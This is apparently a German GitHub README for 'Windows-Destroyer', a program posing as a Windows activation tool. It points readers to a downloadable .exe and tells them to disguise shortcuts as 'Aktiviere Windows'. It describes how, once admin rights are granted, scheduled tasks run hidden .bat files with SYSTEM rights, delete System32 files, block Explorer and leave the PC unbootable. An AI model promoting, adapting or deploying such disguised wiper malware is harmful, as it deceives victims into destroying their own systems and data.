# Windows-Aktivierung-Tool
Ein programm was sich als aktivierungs tool ausgibt, um ein System komplett zu zerstören

# Wie funktionierts?
In der [Releases](https://github.com/MarcBeast/Windows-Destroyer/releases) page kannst du die neuste version als .exe herunterladen
Diese .exe wurde mit dem windows iexpress Tool erstellt und entpackt den windows destroyer.

Nun kannst du die "Run Me!" Datei ausführen, diese kannst du auch beliebig umbenennen oder verknüpfungen zu ihr erstellen getarnt als "Aktiviere Windows" oder ähnliches auf dem Desktop, sie darf jedoch nicht verschoben oder kopiert werden, es dürfen jedoch keine anderen dateien umbenannt oder gelöscht werden. 

# Was wird passieren?
Sobald die "Run Me!" Datei ausgeführt wurde und der UAC als admin bestätigt wurde, wurden schon einige wichtige dateien erstellt, wenn man in der Engine angelangt ist und zur "Initialisierung" kommt werden aufgaben erstellt für windows die beim systemstart oder beim anmelden eines Benutzers aktiviert werden. Diese aufgaben öffnen .bat dateien mit System rechten was heisst, es ist unsichtbar und kann nicht aufgehalten werden, dabei werden wichtige dateien in System32 gelöscht was windows nicht mehr booten lässt, was einem am meisten auffallen wird ist das Explorer.exe nicht mehr ausgefühert werden kann - heisst keine Benutzeroberfläche mehr ausser ein Ständiges Popup mit: "Dieser PC kann nicht mehr verwendet werden". Wird der PC nun neu gestartet kann er nicht mehr booten.

# Kann man den PC retten?
Windows selber kann sich nicht mehr reparieren, was heisst das man die festplatte an einen anderen PC Anhängen müsste um seine dateien zu sicher.
Windows muss dann neu installiert werden. Andere Festplatten werden von dem Tool nicht betroffen
